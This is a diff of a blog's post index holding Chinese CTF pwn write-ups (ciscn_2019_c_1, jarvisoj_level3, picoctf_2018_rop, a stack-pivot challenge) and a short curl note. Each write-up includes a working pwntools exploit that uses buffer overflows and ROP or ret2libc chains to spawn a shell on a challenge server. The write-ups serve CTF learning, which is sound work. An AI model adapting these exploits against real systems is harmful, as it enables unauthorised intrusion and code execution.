+<p>IDA打开后F5查看main函数</p>
+<p><img src="/img/image-20210423214542261.png" alt="image-20210423214542261"></p>
+<p>发现没有之前做的gets()栈溢出，但是发现了一个encrypt函数，点开之后查看，找到了gets函数</p>
+<p><img src="/img/image-20210423214700799.png" alt="image-20210423214700799"></p>
+<p>读得内容为gets读取输入内容进入while循环之后是由strlen检查长度，strlen是从字符串开头检测到第一个\x00截断，所以只要在payload的开头置0让strlen判断错误就可以避免对payload的破坏。</p>
+<h4 id="小技巧-遇到strlen和strcmp这两个只需要在payload里放一个-x00就可以绕过"><a href="#小技巧-遇到strlen和strcmp这两个只需要在payload里放一个-x00就可以绕过" class="headerlink" title="小技巧:遇到strlen和strcmp这两个只需要在payload里放一个\x00就可以绕过"></a>小技巧:遇到strlen和strcmp这两个只需要在payload里放一个\x00就可以绕过</h4><p>但这里没有发现后门函数，于是只能自己构造rop链。</p>
+<p>puts()可以用来泄露libc基址。</p>
+<p>gets()可以用来栈溢出，栈大小0x50。</p>
+<p><img src="/img/image-20210430234840983.png" alt="image-20210430234840983"></p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">content = <span class="number">0</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x4006b9</span>      </span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>] </span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span>      <span class="comment">#×64程序基本都存在的一个地址pop rdi；ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">	<span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">		p = process(<span class="string">&#x27;ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">	<span class="keyword">else</span>:	</span><br><span class="line">		p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29999</span>)</span><br><span class="line"></span><br><span class="line">	payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x50</span> + <span class="number">8</span>)</span><br><span class="line">	payload = payload + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)	</span><br><span class="line">	p.recvline()</span><br><span class="line">	puts_addr = u64(p.recv(<span class="number">7</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	<span class="built_in">print</span>(puts_addr)      <span class="comment">#找出puts的地址</span></span><br><span class="line"></span><br><span class="line">	libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line"></span><br><span class="line">	libc_base   = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)      <span class="comment">#找出函数地址偏移量</span></span><br><span class="line">	system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)      <span class="comment">#计算出system的在程序中的地址</span></span><br><span class="line">	binsh_addr  = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)	</span><br><span class="line"></span><br><span class="line">	payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x50</span> + <span class="number">8</span>)</span><br><span class="line">	payload = payload + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>cat flag</p>
+<p><img src="/img/image-20210501002359709.png" alt="image-20210501002359709"></p>
 ]]></content>
       <categories>
-        <category>日常闲话</category>
+        <category>writeup</category>
       </categories>
       <tags>
-        <tag>生活</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CURL</title>
+    <url>/2021/06/17/curl%E5%91%BD%E4%BB%A4%EF%BC%88http%E8%AF%B7%E6%B1%82%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="curl-命令"><a href="#curl-命令" class="headerlink" title="curl 命令"></a>curl 命令</h1><span id="more"></span>
+
+<p>curl 命令在 Linux 操作系统中经常来测试网络和 url 的联通性，模拟正常的网络访问。除此之外，curl<br>还支持包括 HTTP、HTTPS、ftp 等众多协议，还支持 POST、cookies、认证、从指定偏移处下载部分文<br>件等功能<br>1.curl url(获取网址的文本信息)<br>2.curl -i url(获取文本的头部及文本信息)<br>3.curl -x proxy url(使用代理请求网页内容)<br>4.curl -v(获取整个通信过程)<br>5.curl -X url(使用特定方法请求网页文本)<br>6.curl -I url(仅返回头部信息)</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
       </tags>
   </entry>
   <entry>
@@ -454,20 +494,6 @@
       </tags>
   </entry>
   <entry>
-    <title>CURL</title>
-    <url>/2021/06/17/curl%E5%91%BD%E4%BB%A4%EF%BC%88http%E8%AF%B7%E6%B1%82%EF%BC%89/</url>
-    <content><![CDATA[<h1 id="curl-命令"><a href="#curl-命令" class="headerlink" title="curl 命令"></a>curl 命令</h1><span id="more"></span>
-
-<p>curl 命令在 Linux 操作系统中经常来测试网络和 url 的联通性，模拟正常的网络访问。除此之外，curl<br>还支持包括 HTTP、HTTPS、ftp 等众多协议，还支持 POST、cookies、认证、从指定偏移处下载部分文<br>件等功能<br>1.curl url(获取网址的文本信息)<br>2.curl -i url(获取文本的头部及文本信息)<br>3.curl -x proxy url(使用代理请求网页内容)<br>4.curl -v(获取整个通信过程)<br>5.curl -X url(使用特定方法请求网页文本)<br>6.curl -I url(仅返回头部信息)</p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
-      <tags>
-        <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>get_started_3dsctf_2016</title>
     <url>/2021/06/17/get_started_3dsctf_2016/</url>
     <content><![CDATA[<span id="more"></span>
@@ -505,55 +531,30 @@
       </tags>
   </entry>
   <entry>
-    <title>ciscn_2019_c_1</title>
-    <url>/2021/06/28/ciscn-2019-c-1/</url>
-    <content><![CDATA[<h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><p>检查保护机制，64位，开NX</p>
-<p><img src="/img/image-20210429213629885.png" alt="image-20210429213629885"></p>
-<p>IDA打开后F5查看main函数</p>
-<p><img src="/img/image-20210423214542261.png" alt="image-20210423214542261"></p>
-<p>发现没有之前做的gets()栈溢出，但是发现了一个encrypt函数，点开之后查看，找到了gets函数</p>
-<p><img src="/img/image-20210423214700799.png" alt="image-20210423214700799"></p>
-<p>读得内容为gets读取输入内容进入while循环之后是由strlen检查长度，strlen是从字符串开头检测到第一个\x00截断，所以只要在payload的开头置0让strlen判断错误就可以避免对payload的破坏。</p>
-<h4 id="小技巧-遇到strlen和strcmp这两个只需要在payload里放一个-x00就可以绕过"><a href="#小技巧-遇到strlen和strcmp这两个只需要在payload里放一个-x00就可以绕过" class="headerlink" title="小技巧:遇到strlen和strcmp这两个只需要在payload里放一个\x00就可以绕过"></a>小技巧:遇到strlen和strcmp这两个只需要在payload里放一个\x00就可以绕过</h4><p>但这里没有发现后门函数，于是只能自己构造rop链。</p>
-<p>puts()可以用来泄露libc基址。</p>
-<p>gets()可以用来栈溢出，栈大小0x50。</p>
-<p><img src="/img/image-20210430234840983.png" alt="image-20210430234840983"></p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">content = <span class="number">0</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x4006b9</span>      </span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>] </span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span>      <span class="comment">#×64程序基本都存在的一个地址pop rdi；ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">	<span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">		p = process(<span class="string">&#x27;ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">	<span class="keyword">else</span>:	</span><br><span class="line">		p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29999</span>)</span><br><span class="line"></span><br><span class="line">	payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x50</span> + <span class="number">8</span>)</span><br><span class="line">	payload = payload + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)	</span><br><span class="line">	p.recvline()</span><br><span class="line">	puts_addr = u64(p.recv(<span class="number">7</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	<span class="built_in">print</span>(puts_addr)      <span class="comment">#找出puts的地址</span></span><br><span class="line"></span><br><span class="line">	libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line"></span><br><span class="line">	libc_base   = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)      <span class="comment">#找出函数地址偏移量</span></span><br><span class="line">	system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)      <span class="comment">#计算出system的在程序中的地址</span></span><br><span class="line">	binsh_addr  = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)	</span><br><span class="line"></span><br><span class="line">	payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x50</span> + <span class="number">8</span>)</span><br><span class="line">	payload = payload + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+    <title>jarvisoj_level3</title>
+    <url>/2021/06/28/jarvisoj-level3/</url>
+    <content><![CDATA[<h1 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h1><p>检查保护机制，32位，开NX</p>
+<p><img src="/img/image-20210628222619420.png" alt="image-20210628222619420"></p>
+<p>IDA打开，shift+F12没有找到system和’/bin/sh’，所以应该也是libc泄露</p>
+<p>查看main函数，又看到了熟悉的vulnerable_function()函数</p>
+<p><img src="/img/image-20210628222739706.png" alt="image-20210628222739706"></p>
+<p><img src="/img/image-20210628222833493.png" alt="image-20210628222833493"></p>
+<p>果然漏洞就在这个函数里</p>
+<p>写入长度只有7，而读的长度有0x100，漏洞很大</p>
+<p>解题思路和前几个题都类似了</p>
+<h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><p>1.通过write函数泄露libc版本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>2.计算libc基址，算出system和/bin/sh的地址</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">sh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>3.构造rop，执行system(‘/bin/sh’)</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system)+p32(main)+p32(sh)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28991</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./level3&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main=<span class="number">0x804844B</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc=LibcSearcher(&#x27;write&#x27;,write_addr)</span></span><br><span class="line">libc_base=write_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh=libc_base+ <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system)+p32(main)+p32(sh)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>cat flag</p>
-<p><img src="/img/image-20210501002359709.png" alt="image-20210501002359709"></p>
-]]></content>
-      <categories>
-        <category>writeup</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>picoctf_2018_rop</title>
-    <url>/2021/07/17/picoctf-2018-rop/</url>
-    <content><![CDATA[<h1 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a>picoctf_2018_rop chain</h1><p>检查保护机制，32位，开NX</p>
-<p><img src="/img/image-20210717100253970.png" alt="image-20210717100253970"></p>
-<p>IDA打开</p>
-<p>main函数，里面发现vuln函数</p>
-<p><img src="/img/image-20210717100706788.png" alt="image-20210717100706788"></p>
-<p><img src="/img/image-20210717100744059.png" alt="image-20210717100744059"></p>
-<h4 id="漏洞点：没有限制输入字符串长度"><a href="#漏洞点：没有限制输入字符串长度" class="headerlink" title="漏洞点：没有限制输入字符串长度"></a>漏洞点：没有限制输入字符串长度</h4><p>然后发现了一个flag函数，仔细查看后发现这是一个后门函数</p>
-<p><img src="/img/image-20210717101317225.png" alt="image-20210717101317225"></p>
-<p>win_function1函数</p>
-<p><img src="/img/image-20210717101703475.png" alt="image-20210717101703475"></p>
-<p>win_function2函数</p>
-<p><img src="/img/image-20210717101752632.png" alt="image-20210717101752632"></p>
-<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">需要注意点就是，有个判断 条件<span class="keyword">if</span> <span class="comment">( win1 &amp;&amp; win2 &amp;&amp; a1 == -559039827 )</span>，需要控制wi<span class="symbol">n1</span>、wi<span class="symbol">n2</span>、a<span class="number">1</span></span><br><span class="line">wi<span class="symbol">n1</span>、wi<span class="symbol">n2</span>可以通过调用对应的函数进行赋值，而a<span class="number">1</span>是作为flag函数的参数，在栈上构造好数据即可</span><br></pre></td></tr></table></figure>
-
-<p>先对win1赋值，使win1=1</p>
-<p>然后当win_function2的参数a1=-1163220307，对win2进行赋值，win2=1</p>
-<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28400</span>)</span><br><span class="line"></span><br><span class="line">win_function1 = <span class="number">0x080485CB</span></span><br><span class="line">win_function2 = <span class="number">0x080485D8</span></span><br><span class="line">flag = <span class="number">0x0804862B</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x1c</span></span><br><span class="line">payload += p32(win_function1)</span><br><span class="line">payload += p32(win_function2) + p32(flag) + p32(<span class="number">0xBAAAAAAD</span>) + p32(<span class="number">0xDEADBAAD</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;input&gt; &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h4><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">0xBAAAAAAD</span>是-<span class="number">1163220307</span>对应的<span class="number">16</span>进制的补码作为win_function<span class="number">2</span>函数的参数</span><br><span class="line"><span class="attribute">0xDEADBAAD</span>是-<span class="number">559039827</span>对应的<span class="number">16</span>进制的补码作为flag函数的参数</span><br></pre></td></tr></table></figure>
-
-<p><img src="/img/image-20210717103414365.png" alt="image-20210717103414365"></p>
+<p><img src="/img/image-20210706133135129.png" alt="image-20210706133135129"></p>
 ]]></content>
       <categories>
         <category>writeup</category>
@@ -595,6 +596,38 @@
       </tags>
   </entry>
   <entry>
+    <title>picoctf_2018_rop</title>
+    <url>/2021/07/17/picoctf-2018-rop/</url>
+    <content><![CDATA[<h1 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a>picoctf_2018_rop chain</h1><p>检查保护机制，32位，开NX</p>
+<p><img src="/img/image-20210717100253970.png" alt="image-20210717100253970"></p>
+<p>IDA打开</p>
+<p>main函数，里面发现vuln函数</p>
+<p><img src="/img/image-20210717100706788.png" alt="image-20210717100706788"></p>
+<p><img src="/img/image-20210717100744059.png" alt="image-20210717100744059"></p>
+<h4 id="漏洞点：没有限制输入字符串长度"><a href="#漏洞点：没有限制输入字符串长度" class="headerlink" title="漏洞点：没有限制输入字符串长度"></a>漏洞点：没有限制输入字符串长度</h4><p>然后发现了一个flag函数，仔细查看后发现这是一个后门函数</p>
+<p><img src="/img/image-20210717101317225.png" alt="image-20210717101317225"></p>
+<p>win_function1函数</p>
+<p><img src="/img/image-20210717101703475.png" alt="image-20210717101703475"></p>
+<p>win_function2函数</p>
+<p><img src="/img/image-20210717101752632.png" alt="image-20210717101752632"></p>
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">需要注意点就是，有个判断 条件<span class="keyword">if</span> <span class="comment">( win1 &amp;&amp; win2 &amp;&amp; a1 == -559039827 )</span>，需要控制wi<span class="symbol">n1</span>、wi<span class="symbol">n2</span>、a<span class="number">1</span></span><br><span class="line">wi<span class="symbol">n1</span>、wi<span class="symbol">n2</span>可以通过调用对应的函数进行赋值，而a<span class="number">1</span>是作为flag函数的参数，在栈上构造好数据即可</span><br></pre></td></tr></table></figure>
+
+<p>先对win1赋值，使win1=1</p>
+<p>然后当win_function2的参数a1=-1163220307，对win2进行赋值，win2=1</p>
+<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28400</span>)</span><br><span class="line"></span><br><span class="line">win_function1 = <span class="number">0x080485CB</span></span><br><span class="line">win_function2 = <span class="number">0x080485D8</span></span><br><span class="line">flag = <span class="number">0x0804862B</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x1c</span></span><br><span class="line">payload += p32(win_function1)</span><br><span class="line">payload += p32(win_function2) + p32(flag) + p32(<span class="number">0xBAAAAAAD</span>) + p32(<span class="number">0xDEADBAAD</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;input&gt; &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h4><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">0xBAAAAAAD</span>是-<span class="number">1163220307</span>对应的<span class="number">16</span>进制的补码作为win_function<span class="number">2</span>函数的参数</span><br><span class="line"><span class="attribute">0xDEADBAAD</span>是-<span class="number">559039827</span>对应的<span class="number">16</span>进制的补码作为flag函数的参数</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20210717103414365.png" alt="image-20210717103414365"></p>
+]]></content>
+      <categories>
+        <category>writeup</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>pwn1</title>
     <url>/2021/07/15/pwn1/</url>
     <content><![CDATA[<h2 id="Black-Watch-入群题-PWN"><a href="#Black-Watch-入群题-PWN" class="headerlink" title="[Black Watch 入群题]PWN"></a>[Black Watch 入群题]PWN</h2><p>检查保护机制，32位，开NX</p>
@@ -613,67 +646,6 @@
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27426</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;spwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss_s = <span class="number">0x0804A300</span>				<span class="comment">#将fake栈迁移到bss中</span></span><br><span class="line">leave_ret = <span class="number">0x08048511</span>			<span class="comment">#栈迁移所需要的的地址</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]	<span class="comment">#plt表可以调用write函数</span></span><br><span class="line">write_got = elf.got[<span class="string">&quot;write&quot;</span>]	<span class="comment">#got表里有write函数的真实地址</span></span><br><span class="line">main_addr = elf.sym[<span class="string">&quot;main&quot;</span>]	<span class="comment">#控制函数执行流需要再次回到主函数</span></span><br><span class="line"><span class="comment"># 需要打印出write的真实地址查出，并且让函数再次返回主函数</span></span><br><span class="line">payload = <span class="string">b&quot;aaaa&quot;</span> + p32(write_plt) + p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;name?&quot;</span>, payload)</span><br><span class="line"><span class="comment"># 上面将一些执行流程写入了bss段</span></span><br><span class="line"><span class="comment"># 接下来的写入的buf在栈上，所以可以控制程序执行到bss段</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x18</span> <span class="comment">#这个payload是写到栈上进行栈迁移的，所以先填充到ebp之前</span></span><br><span class="line">payload += p32(bss_s) + p32(leave_ret)</span><br><span class="line">p.sendafter(<span class="string">&quot;say?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>)) <span class="comment">#接收泄露的地址</span></span><br><span class="line"><span class="comment">#libc = LibcSearcher(&quot;write&quot;, write_addr) #利用LibcSearcher函数可以根据泄露的地址找到相应的libc版本</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&quot;write&quot;</span>]<span class="comment">#获取libc的基地址</span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]<span class="comment">#通过获取到的libc的基地址和system在libc中的偏移量可以得到system在程序中的真实地址</span></span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))<span class="comment">#通过获取到的libc的基地址和&quot;/bin/sh&quot;在libc中的地址可以得到&quot;/bin/sh&quot;在程序中的真实地址</span></span><br><span class="line"><span class="comment"># 第一次执行得到system函数地址后接下来会再次执行main函数</span></span><br><span class="line"><span class="comment"># 在这次有system函数的情况下再次进行相同的栈迁移执行system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">payload = <span class="string">b&quot;aaaa&quot;</span> + p32(system_addr) + p32(main_addr)</span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line">p.sendafter(<span class="string">&quot;name?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x18</span> + p32(bss_s) + p32(leave_ret)</span><br><span class="line">p.sendafter(<span class="string">&quot;say?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p><img src="/img/image-20210715120438512.png" alt="image-20210715120438512"></p>
-]]></content>
-      <categories>
-        <category>writeup</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
